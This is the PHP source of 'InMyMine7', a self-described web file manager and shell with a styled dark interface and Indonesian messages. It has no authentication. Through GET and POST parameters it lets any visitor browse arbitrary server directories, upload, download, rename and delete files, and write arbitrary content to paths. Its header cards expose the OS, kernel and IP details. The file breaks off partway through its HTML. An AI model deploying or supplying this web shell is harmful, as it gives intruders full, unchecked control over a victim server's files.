<?php
$root_dir    = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;
if (!$current_dir || !is_dir($current_dir)) $current_dir = $root_dir;

function fmt_size($b){
    if($b<1024)return $b.' B';
    if($b<1048576)return round($b/1024,1).' KB';
    if($b<1073741824)return round($b/1048576,1).' MB';
    return round($b/1073741824,1).' GB';
}

function fa_icon($name){
    $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
    $m=[
        'php'=>['fa-brands fa-php','#8892bf'],
        'js' =>['fa-brands fa-js','#f7df1e'],
        'ts' =>['fa-solid fa-code','#3178c6'],
        'html'=>['fa-brands fa-html5','#e34c26'],
        'htm'=>['fa-brands fa-html5','#e34c26'],
        'css'=>['fa-brands fa-css3-alt','#264de4'],
        'json'=>['fa-solid fa-brackets-curly','#ffca28'],
        'xml'=>['fa-solid fa-file-code','#ff6d00'],
        'sql'=>['fa-solid fa-database','#00acc1'],
        'jpg'=>['fa-solid fa-image','#ab47bc'],
        'jpeg'=>['fa-solid fa-image','#ab47bc'],
        'png'=>['fa-solid fa-image','#ab47bc'],
        'gif'=>['fa-solid fa-gif','#ab47bc'],
        'svg'=>['fa-solid fa-bezier-curve','#ff7043'],
        'webp'=>['fa-solid fa-image','#ab47bc'],
        'mp4'=>['fa-solid fa-film','#ef5350'],
        'mkv'=>['fa-solid fa-film','#ef5350'],
        'avi'=>['fa-solid fa-film','#ef5350'],
        'mp3'=>['fa-solid fa-music','#26c6da'],
        'wav'=>['fa-solid fa-waveform','#26c6da'],
        'zip'=>['fa-solid fa-file-zipper','#ffa726'],
        'rar'=>['fa-solid fa-file-zipper','#ffa726'],
        'tar'=>['fa-solid fa-file-zipper','#ffa726'],
        'gz' =>['fa-solid fa-file-zipper','#ffa726'],
        'pdf'=>['fa-solid fa-file-pdf','#f44336'],
        'doc'=>['fa-solid fa-file-word','#2b579a'],
        'docx'=>['fa-solid fa-file-word','#2b579a'],
        'xls'=>['fa-solid fa-file-excel','#217346'],
        'xlsx'=>['fa-solid fa-file-excel','#217346'],
        'txt'=>['fa-solid fa-file-lines','#90a4ae'],
        'log'=>['fa-solid fa-scroll','#78909c'],
        'sh' =>['fa-solid fa-terminal','#66bb6a'],
        'py' =>['fa-brands fa-python','#3572a5'],
        'env'=>['fa-solid fa-lock','#ffca28'],
    ];
    if(isset($m[$ext]))return $m[$ext];
    return ['fa-solid fa-file','#607d8b'];
}

function breadcrumb_parts($path){
    $path=str_replace('\\','/',$path);
    $parts=array_values(array_filter(explode('/',$path),fn($p)=>$p!==''));
    $crumbs=[];$built='';
    foreach($parts as $i=>$seg){
        if($i===0&&strlen($seg)===2&&$seg[1]===':') $built=$seg;
        else $built=$built.DIRECTORY_SEPARATOR.$seg;
        $crumbs[]=['label'=>$seg,'path'=>$built];
    }
    return $crumbs;
}

function redir($dir,$type,$msg){
    header("Location: ?dir=".urlencode($dir)."&t_type=".urlencode($type)."&t_msg=".urlencode($msg));
    exit;
}

if(isset($_GET['delete'])){
    $name=basename($_GET['delete']);$t=realpath($current_dir.'/'.$name);
    if($t&&is_file($t)&&unlink($t)) redir($current_dir,'success',"File \"$name\" berhasil dihapus.");
    else redir($current_dir,'error',"Gagal menghapus \"$name\".");
}
if(isset($_GET['download'])){
    $t=realpath($current_dir.'/'.basename($_GET['download']));
    if($t&&is_file($t)){
        header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($t).'"');
        header('Content-Length: '.filesize($t));readfile($t);exit;
    }
    redir($current_dir,'error',"File tidak ditemukan untuk diunduh.");
}
if(isset($_POST['rename_file'])){
    $old=trim($_POST['old_name']);$new=trim($_POST['new_name']);
    if($new&&@rename($current_dir.'/'.$old,$current_dir.'/'.$new)) redir($current_dir,'success',"Berhasil diubah: \"$old\" → \"$new\"");
    else redir($current_dir,'error',"Gagal mengubah nama \"$old\".");
}
if(isset($_POST['upload'])){
    $fname=basename($_FILES['file']['name']);$target=$current_dir.'/'.$fname;
    if($fname&&move_uploaded_file($_FILES['file']['tmp_name'],$target)) redir($current_dir,'success',"File \"$fname\" berhasil diupload.");
    else redir($current_dir,'error',"Gagal mengupload file.");
}
if(isset($_POST['save_file'])){
    $fname=$_POST['file_name'];$bytes=file_put_contents($current_dir.'/'.$fname,$_POST['file_content']);
    if($bytes!==false) redir($current_dir,'success',"\"$fname\" disimpan ($bytes bytes).");
    else redir($current_dir,'error',"Gagal menyimpan \"$fname\".");
}
if(isset($_POST['create_file'])){
    $fname=trim($_POST['new_file_name']);$path=$current_dir.'/'.$fname;
    if(!$fname) redir($current_dir,'error',"Nama file tidak boleh kosong.");
    elseif(file_exists($path)) redir($current_dir,'error',"File \"$fname\" sudah ada.");
    elseif(file_put_contents($path,'')!==false) redir($current_dir,'success',"File \"$fname\" berhasil dibuat.");
    else redir($current_dir,'error',"Gagal membuat file \"$fname\".");
}

function listDirectory($dir){
    $items=@scandir($dir);
    if(!$items){echo'<tr><td colspan="4" class="empty-td"><div class="empty-state"><i class="fa-solid fa-circle-exclamation"></i><span>Cannot read directory</span></div></td></tr>';return;}
    $dirs=$files=[];
    foreach($items as $f){if($f==='.'||$f==='..') continue; is_dir($dir.'/'.$f)?$dirs[]=$f:$files[]=$f;}
    if(!$dirs&&!$files){echo'<tr><td colspan="4" class="empty-td"><div class="empty-state"><i class="fa-solid fa-box-open"></i><span>Folder ini kosong</span></div></td></tr>';return;}
    $eD=urlencode($dir);
    foreach($dirs as $d){
        $eD2=urlencode($dir.'/'.$d);$eF=urlencode($d);
        $mtime=date('d M Y  H:i',filemtime($dir.'/'.$d));
        echo "<tr class='fr' onclick=\"location='?dir={$eD2}'\" style='cursor:pointer'>
  <td class='nc'><span class='fi-wrap'><i class='fa-solid fa-folder fi-folder'></i></span><span class='fn'>{$d}</span></td>
  <td><span class='badge-dir'><i class='fa-solid fa-folder-open'></i> DIR</span></td>
  <td class='mtime'>{$mtime}</td>
  <td class='ac' onclick='event.stopPropagation()'>
    <a href='?dir={$eD2}' class='ab ab-open' title='Buka'><i class='fa-solid fa-folder-open'></i></a>
    <a href='?dir={$eD}&rename={$eF}' class='ab ab-rename' title='Rename'><i class='fa-solid fa-pen'></i></a>
    <a href='?dir={$eD}&download={$eF}' class='ab ab-dl' title='Download'><i class='fa-solid fa-download'></i></a>
    <a href='?dir={$eD}&delete={$eF}' class='ab ab-del' title='Hapus' onclick=\"return confirm('Hapus folder &quot;{$d}&quot;?')\"><i class='fa-solid fa-trash'></i></a>
  </td>
</tr>";
    }
    foreach($files as $f){
        $size=filesize($dir.'/'.$f);$sstr=fmt_size($size);
        [$fic,$fcol]=fa_icon($f);$eF=urlencode($f);
        $mtime=date('d M Y  H:i',filemtime($dir.'/'.$f));
        echo "<tr class='fr'>
  <td class='nc'><span class='fi-wrap'><i class='{$fic} fi-file' style='color:{$fcol}'></i></span><span class='fn'>{$f}</span></td>
  <td><span class='fsize'>{$sstr}</span></td>
  <td class='mtime'>{$mtime}</td>
  <td class='ac'>
    <a href='?dir={$eD}&edit={$eF}' class='ab ab-edit' title='Edit'><i class='fa-solid fa-code'></i></a>
    <a href='?dir={$eD}&rename={$eF}' class='ab ab-rename' title='Rename'><i class='fa-solid fa-pen'></i></a>
    <a href='?dir={$eD}&download={$eF}' class='ab ab-dl' title='Download'><i class='fa-solid fa-download'></i></a>
    <a href='?dir={$eD}&delete={$eF}' class='ab ab-del' title='Hapus' onclick=\"return confirm('Hapus file &quot;{$f}&quot;?')\"><i class='fa-solid fa-trash'></i></a>
  </td>
</tr>";
    }
}

$all=array_filter(scandir($current_dir),fn($f)=>$f!='.'&&$f!='..');
$fc=count(array_filter($all,fn($f)=>is_file($current_dir.'/'.$f)));
$dc=count(array_filter($all,fn($f)=>is_dir($current_dir.'/'.$f)));
$crumbs=breadcrumb_parts($current_dir);
$disk_free=function_exists('disk_free_space')?fmt_size(disk_free_space($current_dir)):'N/A';
$disk_total=function_exists('disk_total_space')?fmt_size(disk_total_space($current_dir)):'N/A';
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InMyMine7</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,300&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
:root{
  --bg:#080810;
  --s1:#0d0d1a;
  --s2:#111124;
  --s3:#161630;
  --s4:#1c1c3a;
  --b1:#1e1e3c;
  --b2:#272750;
  --b3:#353566;

  --v:#7c5cfc;   /* violet */
  --v2:#a080ff;
  --v3:#c4aaff;
  --c:#00f5c4;   /* cyan */
  --c2:#4fffd8;
  --pk:#ff4d8d;  /* pink */
  --pk2:#ff80aa;
  --y:#ffd166;   /* yellow */
  --g:#39ff7e;   /* green */
  --r:#ff3d6b;   /* red */

  --txt:#e0e0f0;
  --dim:#7070a0;
  --mute:#404068;
  --ghost:#22223a;

  --rad:14px;
  --rads:8px;
  --radp:5px;
  --tr:all .18s cubic-bezier(.4,0,.2,1);
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{
  background:var(--bg);color:var(--txt);
  font-family:'DM Sans',sans-serif;
  min-height:100vh;overflow-x:hidden;
  -webkit-font-smoothing:antialiased;
}

/* ── Layered background ── */
.bg-layer{
  position:fixed;inset:0;pointer-events:none;z-index:0;
}
.bg-layer::before{
  content:'';position:absolute;inset:0;
  background:
    radial-gradient(ellipse 90% 60% at 5% -10%,  rgba(124,92,252,.18) 0%,transparent 55%),
    radial-gradient(ellipse 70% 80% at 100% 110%, rgba(0,245,196,.11)  0%,transparent 55%),
    radial-gradient(ellipse 60% 50% at 60%  55%,  rgba(255,77,141,.07) 0%,transparent 55%);
}
/* scan lines */
.bg-layer::after{
  content:'';position:absolute;inset:0;
  background:repeating-linear-gradient(
    0deg,
    transparent,transparent 2px,
    rgba(0,0,0,.06) 2px,rgba(0,0,0,.06) 4px
  );
  pointer-events:none;
}
/* grid */
.bg-grid{
  position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:
    linear-gradient(rgba(124,92,252,.04) 1px,transparent 1px),
    linear-gradient(90deg,rgba(124,92,252,.04) 1px,transparent 1px);
  background-size:40px 40px;
}

/* ── Layout ── */
.wrap{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:28px 24px 100px}

/* ── HEADER ── */
.hdr{
  display:flex;align-items:center;justify-content:space-between;
  margin-bottom:28px;padding-bottom:20px;
  border-bottom:1px solid var(--b1);
  flex-wrap:wrap;gap:16px;
  position:relative;
}
.hdr::after{
  content:'';position:absolute;bottom:-1px;left:0;width:120px;height:1px;
  background:linear-gradient(90deg,var(--v),transparent);
}

.brand-block{display:flex;align-items:center;gap:16px}
.brand-logo{
  width:46px;height:46px;border-radius:12px;
  background:linear-gradient(135deg,var(--v),var(--c));
  display:flex;align-items:center;justify-content:center;
  font-size:1.2rem;color:#fff;
  box-shadow:0 0 24px rgba(124,92,252,.5),0 0 48px rgba(124,92,252,.2);
  flex-shrink:0;
}
.brand-text{}
.brand{
  font-family:'Fira Code',monospace;font-weight:700;
  font-size:clamp(1.3rem,4vw,1.85rem);letter-spacing:-.03em;
  background:linear-gradient(120deg,var(--v) 0%,var(--c) 50%,var(--pk) 100%);
  background-size:200% auto;
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  animation:shimmer 5s linear infinite;line-height:1;
}
@keyframes shimmer{to{background-position:200% center}}
.brand-sub{
  font-family:'Fira Code',monospace;font-size:.6rem;font-weight:300;
  color:var(--dim);letter-spacing:.2em;text-transform:uppercase;margin-top:2px;
}

.hdr-right{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.hdr-pill{
  display:flex;align-items:center;gap:7px;
  padding:6px 14px;
  background:var(--s2);border:1px solid var(--b1);
  border-radius:30px;font-size:.72rem;font-weight:500;
  color:var(--dim);
  transition:var(--tr);
}
.hdr-pill:hover{border-color:var(--b3);color:var(--txt)}
.hdr-pill i{color:var(--v2);font-size:.75rem}
.hdr-pill strong{color:var(--txt);font-weight:700}

/* ── INFO CARDS ── */
.cards{
  display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
  gap:10px;margin-bottom:20px;
}
.card{
  background:var(--s1);border:1px solid var(--b1);
  border-radius:var(--rad);padding:14px 16px;
  position:relative;overflow:hidden;
  transition:var(--tr);cursor:default;
}
.card::before{
  content:'';position:absolute;top:0;left:0;right:0;height:2px;
  background:linear-gradient(90deg,var(--v),var(--c),var(--pk));
  background-size:200% auto;
  transform:scaleX(0);transform-origin:left;
  transition:transform .3s ease;
}
.card:hover{border-color:var(--b3);transform:translateY(-3px);box-shadow:0 8px 32px rgba(0,0,0,.3)}
.card:hover::before{transform:scaleX(1)}
.card-icon{
  width:32px;height:32px;border-radius:8px;
  display:flex;align-items:center;justify-content:center;
  font-size:.85rem;margin-bottom:10px;
}
.card-icon.vi{background:rgba(124,92,252,.15);color:var(--v2)}
.card-icon.ci{background:rgba(0,245,196,.12);color:var(--c)}
.card-icon.pi{background:rgba(255,77,141,.12);color:var(--pk2)}
.card-icon.yi{background:rgba(255,209,102,.12);color:var(--y)}
.card-lbl{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.15em;color:var(--mute);margin-bottom:4px}
.card-val{font-family:'Fira Code',monospace;font-size:.78rem;color:var(--c2);word-break:break-all;line-height:1.45}

/* ── BREADCRUMB ── */
.bc{
  display:flex;align-items:center;
  background:var(--s1);border:1px solid var(--b1);
  border-radius:var(--rad);
  margin-bottom:16px;overflow:hidden;
  font-family:'Fira Code',monospace;font-size:.75rem;
  overflow-x:auto;white-space:nowrap;
  scrollbar-width:thin;scrollbar-color:var(--mute) transparent;
}
.bc::-webkit-scrollbar{height:3px}
.bc::-webkit-scrollbar-thumb{background:var(--mute);border-radius:3px}
.bc-home{
  display:flex;align-items:center;justify-content:center;
  padding:0 16px;height:44px;
  background:linear-gradient(135deg,rgba(124,92,252,.15),rgba(0,245,196,.08));
  border-right:1px solid var(--b1);
  color:var(--v2);font-size:.95rem;flex-shrink:0;
}
.bc-seg{display:inline-flex;align-items:center;height:44px;flex-shrink:0}
.bc-seg a{
  display:flex;align-items:center;height:100%;
  padding:0 13px;color:var(--dim);text-decoration:none;
  transition:var(--tr);position:relative;
}
.bc-seg a:hover{color:var(--c);background:rgba(0,245,196,.06)}
.bc-seg a::after{
  content:'';position:absolute;bottom:0;left:8px;right:8px;
  height:2px;background:var(--c);border-radius:2px;
  transform:scaleX(0);transition:transform .2s;
}
.bc-seg a:hover::after{transform:scaleX(1)}
.bc-cur{
  display:flex;align-items:center;height:100%;
  padding:0 16px;color:var(--txt);font-weight:600;
  background:rgba(124,92,252,.08);cursor:default;
}
.bc-arrow{color:var(--mute);padding:0 3px;user-select:none;font-size:.8rem}

/* ── TOOLBAR ── */
.toolbar{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.toolbox{
  flex:1;min-width:240px;
  background:var(--s1);border:1px solid var(--b1);
  border-radius:var(--rad);
  display:flex;align-items:center;gap:10px;
  padding:0 6px 0 16px;height:52px;
  transition:var(--tr);
}
.toolbox:focus-within{border-color:var(--v);box-shadow:0 0 0 3px rgba(124,92,252,.12)}
.toolbox-icon{color:var(--dim);font-size:.9rem;flex-shrink:0}
.toolbox-lbl{
  font-size:.58rem;font-weight:700;text-transform:uppercase;
  letter-spacing:.15em;color:var(--mute);white-space:nowrap;flex-shrink:0;
}
.toolbox input[type=text]{
  flex:1;background:transparent;border:none;outline:none;
  color:var(--txt);font-family:'Fira Code',monospace;
  font-size:.78rem;min-width:0;
}
.toolbox input[type=text]::placeholder{color:var(--mute)}

/* ── Custom file input ── */
.file-drop{
  flex:1;min-width:0;position:relative;
  display:flex;align-items:center;gap:9px;
  cursor:pointer;
}
.file-drop input[type=file]{
  position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;z-index:2;
}
.file-drop-label{
  display:flex;align-items:center;gap:8px;
  padding:5px 12px;
  background:var(--s3);
  border:1px dashed var(--b3);
  border-radius:var(--rads);
  font-family:'Fira Code',monospace;font-size:.73rem;
  color:var(--dim);white-space:nowrap;overflow:hidden;
  transition:var(--tr);flex:1;min-width:0;
  pointer-events:none;
}
.file-drop-label i{color:var(--v2);flex-shrink:0;font-size:.8rem}
.file-drop-label .fdn{
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;
}
.file-drop:hover .file-drop-label,
.file-drop.has-file .file-drop-label{
  border-color:var(--v);color:var(--txt);
  background:rgba(124,92,252,.08);
  box-shadow:0 0 0 2px rgba(124,92,252,.12);
}
.file-drop.has-file .file-drop-label i{color:var(--c)}
.file-drop.drag-over .file-drop-label{
  border-color:var(--c);color:var(--c);
  background:rgba(0,245,196,.08);
  box-shadow:0 0 0 2px rgba(0,245,196,.15);
}

/* ── BUTTONS ── */
.btn{
  display:inline-flex;align-items:center;gap:7px;
  border:none;border-radius:var(--rads);cursor:pointer;
  font-family:'DM Sans',sans-serif;font-weight:700;
  font-size:.8rem;text-decoration:none;
  transition:var(--tr);white-space:nowrap;
  letter-spacing:.02em;flex-shrink:0;
}
.btn-v{
  background:linear-gradient(135deg,var(--v),#5c3de0);
  color:#fff;padding:9px 20px;
  box-shadow:0 2px 0 rgba(0,0,0,.4),0 0 0 1px rgba(124,92,252,.3);
}
.btn-v:hover{background:linear-gradient(135deg,var(--v2),var(--v));transform:translateY(-2px);box-shadow:0 6px 20px rgba(124,92,252,.45)}
.btn-v:active{transform:translateY(0)}
.btn-c{
  background:transparent;color:var(--c);
  border:1.5px solid rgba(0,245,196,.4);padding:8px 18px;
}
.btn-c:hover{background:rgba(0,245,196,.1);border-color:var(--c);transform:translateY(-2px);box-shadow:0 4px 16px rgba(0,245,196,.2)}
.btn-save{
  background:linear-gradient(135deg,var(--v),var(--c) 150%);
  color:#fff;padding:10px 26px;font-size:.88rem;
  box-shadow:0 0 28px rgba(124,92,252,.35),0 2px 0 rgba(0,0,0,.3);
}
.btn-save:hover{opacity:.88;transform:translateY(-2px);box-shadow:0 8px 28px rgba(124,92,252,.5)}
.btn-ghost{
  background:var(--ghost);color:var(--dim);
  border:1px solid var(--b2);padding:9px 18px;
}
.btn-ghost:hover{color:var(--txt);border-color:var(--b3)}

/* ── ACTION BUTTONS ── */
.ab{
  display:inline-flex;align-items:center;justify-content:center;
  width:32px;height:32px;border-radius:var(--radp);
  text-decoration:none;font-size:.82rem;
  transition:var(--tr);flex-shrink:0;
  border:1px solid transparent;
  position:relative;overflow:hidden;
}
.ab::before{
  content:'';position:absolute;inset:0;opacity:0;transition:opacity .15s;
}
.ab:hover::before{opacity:1}
.ab:hover{transform:translateY(-2px) scale(1.08)}

.ab-open  {background:rgba(57,255,126,.08); border-color:rgba(57,255,126,.2); color:var(--g)}
.ab-edit  {background:rgba(124,92,252,.1);  border-color:rgba(124,92,252,.25);color:var(--v2)}
.ab-rename{background:rgba(255,209,102,.09);border-color:rgba(255,209,102,.25);color:var(--y)}
.ab-dl    {background:rgba(0,245,196,.09);  border-color:rgba(0,245,196,.25); color:var(--c)}
.ab-del   {background:rgba(255,61,107,.09); border-color:rgba(255,61,107,.25);color:var(--r)}
.ab-open::before  {background:rgba(57,255,126,.1)}
.ab-edit::before  {background:rgba(124,92,252,.12)}
.ab-rename::before{background:rgba(255,209,102,.1)}
.ab-dl::before    {background:rgba(0,245,196,.1)}
.ab-del::before   {background:rgba(255,61,107,.1)}

/* ── TABLE ── */
.tbl-wrap{
  background:var(--s1);border:1px solid var(--b1);
  border-radius:var(--rad);overflow:hidden;overflow-x:auto;
}
table{width:100%;border-collapse:collapse;min-width:580px}
thead tr{
  background:linear-gradient(90deg,var(--s3),var(--s2));
  border-bottom:1px solid var(--b2);
}
th{
  padding:13px 16px;font-size:.6rem;font-weight:700;
  text-transform:uppercase;letter-spacing:.16em;color:var(--mute);text-align:left;
}
th i{margin-right:5px;color:var(--b3)}

.fr{border-bottom:1px solid rgba(30,30,60,.7);transition:background .13s}
.fr:last-child{border-bottom:none}
.fr:hover{background:rgba(124,92,252,.05)}
td{padding:10px 16px;vertical-align:middle;font-size:.87rem}

.nc{display:flex;align-items:center;gap:11px}
.fi-wrap{
  width:34px;height:34px;border-radius:8px;
  display:flex;align-items:center;justify-content:center;
  background:var(--s3);border:1px solid var(--b2);flex-shrink:0;
}
.fi-folder{color:#ffd166;font-size:1rem}
.fi-file{font-size:.95rem}
.fn{font-weight:600;color:var(--txt);word-break:break-all;transition:color .14s}
a.fn:hover,.fr:hover a.fn{color:var(--c)}

.badge-dir{
  display:inline-flex;align-items:center;gap:5px;
  padding:3px 10px;border-radius:20px;
  font-size:.6rem;font-weight:800;letter-spacing:.1em;text-transform:uppercase;
  background:rgba(124,92,252,.13);color:var(--v2);
  border:1px solid rgba(124,92,252,.28);
}
.fsize{font-family:'Fira Code',monospace;font-size:.74rem;color:var(--dim)}
.mtime{font-family:'Fira Code',monospace;font-size:.7rem;color:var(--mute);white-space:nowrap}
.ac{display:flex;align-items:center;gap:5px;flex-wrap:nowrap}

.empty-td{padding:0!important}
.empty-state{
  padding:72px 20px;text-align:center;color:var(--mute);
  display:flex;flex-direction:column;align-items:center;gap:12px;
}
.empty-state i{font-size:2.4rem;opacity:.3}
.empty-state span{font-size:.85rem}

/* ── PANEL ── */
.panel{
  margin-top:18px;background:var(--s1);
  border:1px solid var(--b2);border-radius:var(--rad);
  overflow:hidden;
  box-shadow:0 0 0 1px rgba(124,92,252,.1),0 20px 60px rgba(0,0,0,.4);
}
.panel-hdr{
  background:linear-gradient(90deg,var(--s3),var(--s2));
  padding:13px 20px;
  display:flex;align-items:center;gap:10px;
  border-bottom:1px solid var(--b2);
}
.panel-hdr-icon{
  width:28px;height:28px;border-radius:6px;
  background:rgba(124,92,252,.2);
  display:flex;align-items:center;justify-content:center;
  color:var(--v2);font-size:.82rem;
}
.panel-hdr-title{
  font-family:'Fira Code',monospace;
  font-size:.72rem;font-weight:600;
  text-transform:uppercase;letter-spacing:.14em;color:var(--v3);
}
.panel-hdr-name{color:var(--txt);font-weight:400;margin-left:4px;opacity:.8}
.panel-body{padding:20px;display:flex;flex-direction:column;gap:14px}

.field{
  width:100%;background:var(--bg);
  border:1px solid var(--b2);border-radius:var(--rads);
  color:var(--txt);font-family:'Fira Code',monospace;
  font-size:.8rem;padding:11px 15px;outline:none;transition:var(--tr);
}
.field:focus{border-color:var(--v);box-shadow:0 0 0 3px rgba(124,92,252,.12)}
.field::placeholder{color:var(--mute)}
textarea.field{height:460px;resize:vertical;line-height:1.75}

/* ── EDITOR BAR ── */
.editor-meta{
  display:flex;align-items:center;gap:10px;
  padding:8px 15px;
  background:var(--s3);border:1px solid var(--b1);
  border-radius:var(--rads);font-family:'Fira Code',monospace;
  font-size:.7rem;color:var(--dim);flex-wrap:wrap;
}
.editor-meta span{display:flex;align-items:center;gap:5px}
.editor-meta i{color:var(--v2)}

/* ── TOAST ── */
#tc{
  position:fixed;top:24px;right:24px;z-index:9999;
  display:flex;flex-direction:column;gap:10px;
  pointer-events:none;
}
.toast{
  display:flex;align-items:flex-start;gap:14px;
  min-width:300px;max-width:420px;
  padding:0;border-radius:14px;
  border:1px solid transparent;
  pointer-events:all;
  animation:tin .4s cubic-bezier(.34,1.56,.64,1) both;
  position:relative;overflow:hidden;
  box-shadow:0 16px 48px rgba(0,0,0,.5);
}
.toast.hiding{animation:tout .3s ease forwards}

.toast-ok{
  background:linear-gradient(135deg,rgba(6,20,16,.98),rgba(4,16,13,.98));
  border-color:rgba(0,245,196,.3);
  box-shadow:0 16px 48px rgba(0,0,0,.5),0 0 80px rgba(0,245,196,.08) inset;
}
.toast-err{
  background:linear-gradient(135deg,rgba(24,6,12,.98),rgba(20,4,10,.98));
  border-color:rgba(255,61,107,.3);
  box-shadow:0 16px 48px rgba(0,0,0,.5),0 0 80px rgba(255,61,107,.08) inset;
}

.toast-stripe{width:4px;flex-shrink:0;border-radius:14px 0 0 14px}
.toast-ok .toast-stripe{background:linear-gradient(180deg,var(--c),var(--v))}
.toast-err .toast-stripe{background:linear-gradient(180deg,var(--r),var(--pk))}

.toast-inner{flex:1;padding:14px 14px 14px 0;display:flex;gap:12px;align-items:flex-start}
.toast-ico{
  width:36px;height:36px;border-radius:10px;flex-shrink:0;
  display:flex;align-items:center;justify-content:center;font-size:1rem;
}
.toast-ok .toast-ico{background:rgba(0,245,196,.12);color:var(--c)}
.toast-err .toast-ico{background:rgba(255,61,107,.12);color:var(--r)}
.toast-content{flex:1;padding-right:24px}
.toast-title{
  font-family:'DM Sans',sans-serif;font-weight:800;
  font-size:.68rem;text-transform:uppercase;letter-spacing:.14em;margin-bottom:3px;
}
.toast-ok .toast-title{color:var(--c2)}
.toast-err .toast-title{color:#ff7090}
.toast-msg{font-size:.83rem;color:var(--txt);opacity:.88;line-height:1.45;word-break:break-word}
.toast-x{
  position:absolute;top:10px;right:12px;
  font-size:.75rem;color:var(--mute);cursor:pointer;
  background:none;border:none;padding:4px 6px;
  transition:var(--tr);border-radius:4px;
}
.toast-x:hover{color:var(--txt);background:rgba(255,255,255,.07)}
.tbar{
  position:absolute;bottom:0;left:0;height:2px;border-radius:0 0 14px 14px;
  animation:tbar var(--dur,4.5s) linear forwards;
}
.toast-ok .tbar{background:linear-gradient(90deg,var(--c),var(--v))}
.toast-err .tbar{background:linear-gradient(90deg,var(--r),var(--pk))}

@keyframes tin{from{opacity:0;transform:translateX(80px) scale(.9)}to{opacity:1;transform:translateX(0) scale(1)}}
@keyframes tout{from{opacity:1;transform:translateX(0) scale(1)}to{opacity:0;transform:translateX(80px) scale(.9)}}
@keyframes tbar{from{width:100%}to{width:0}}

/* ── DIVIDER ── */
.section-label{
  display:flex;align-items:center;gap:10px;
  margin:20px 0 12px;font-size:.62rem;font-weight:700;
  text-transform:uppercase;letter-spacing:.16em;color:var(--mute);
}
.section-label::after{content:'';flex:1;height:1px;background:var(--b1)}
.section-label i{color:var(--v2)}

/* ── Scrollbar ── */
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--mute);border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:var(--dim)}

/* ── Responsive ── */
@media(max-width:680px){
  .wrap{padding:14px 12px 60px}
  .toolbar{flex-direction:column}
  .toolbox{min-width:unset}
  .ab{width:28px;height:28px;font-size:.75rem}
  .cards{grid-template-columns:1fr 1fr}
  .mtime{display:none}
  #tc{top:12px;right:12px}
  .toast{min-width:260px}
}
</style>
</head>
<body>
<div class="bg-layer"></div>
<div class="bg-grid"></div>

<div class="wrap">

<!-- ── HEADER ── -->
<div class="hdr">
  <div class="brand-block">
    <div class="brand-logo"><i class="fa-solid fa-terminal"></i></div>
    <div class="brand-text">
      <div class="brand">InMyMine7</div>
      <div class="brand-sub"><i class="fa-solid fa-circle" style="color:var(--g);font-size:.45rem"></i> Web File Manager &amp; Shell</div>
    </div>
  </div>
  <div class="hdr-right">
    <div class="hdr-pill"><i class="fa-solid fa-folder-tree"></i> <strong><?=$dc?></strong> folder</div>
    <div class="hdr-pill"><i class="fa-solid fa-file"></i> <strong><?=$fc?></strong> file</div>
    <div class="hdr-pill"><i class="fa-brands fa-php"></i> PHP <strong><?=PHP_VERSION?></strong></div>
    <div class="hdr-pill"><i class="fa-solid fa-hard-drive"></i> <strong><?=$disk_free?></strong> free / <?=$disk_total?></div>
  </div>
</div>

<!-- ── INFO CARDS ── -->
<div class="cards">
  <div class="card">
    <div class="card-icon vi"><i class="fa-solid fa-microchip"></i></div>
    <div class="card-lbl">OS / Kernel</div>
    <div class="card-val"><?=htmlspecialchars(php_uname('s').' '.php_uname('r'))?></div>
  </div>
  <div class="card">
    <div class="card-icon ci"><i class="fa-solid fa-server"></i></div>
    <div class="card-lbl">Server IP</div>
    <div class="card-val"><?=htmlspecialchars($_SERVER['SERVER_ADDR'])?></div>
  </div>
  <div class="card">
    <div class="card-icon pk"><i class="fa-solid fa-location-dot"></i></div>
    <div class="card-lbl">Remote IP</div>
    <div class="card-val"><?=htmlspecialchars($_SERVER['REMOTE_ADDR'])?></div>
  </div>
  <div class="card">
    <div class="card-icon yi"><i class="fa-solid fa-globe"></i></div>
    <div class="card-lbl">Domain · Host IP</div>
    <div class="card-val"><?=htmlspecialchars($_SERVER['SERVER_NAME'])?> · <?=htmlspecialchars(gethostbyname(gethostname()))?></div>
  </div>
</div>

<!-- ── BREADCRUMB ── -->
<div class="bc">
  <div class="bc-home"><i class="fa-solid fa-house-chimney"></i></div>
  <?php $last=count($crumbs)-1;foreach($crumbs as $i=>$c):$isLast=($i===$last);?>
  <div class="bc-seg">
    <?php if($isLast):?><span class="bc-cur"><i class="fa-solid fa-folder-open" style="color:var(--y);margin-right:7px;font-size:.8rem"></i><?=htmlspecialchars($c['label'])?></span>
    <?php else:?><a href="?dir=<?=urlencode($c['path'])?>" title="<?=htmlspecialchars($c['path'])?>"><i class="fa-solid fa-folder" style="color:var(--dim);margin-right:6px;font-size:.75rem"></i><?=htmlspecialchars($c['label'])?></a><?php endif;?>
  </div>
  <?php if(!$isLast):?><span class="bc-arrow"><i class="fa-solid fa-chevron-right"></i></span><?php endif;?>
  <?php endforeach;?>
</div>

<!-- ── TOOLBAR ── -->
<div class="toolbar">
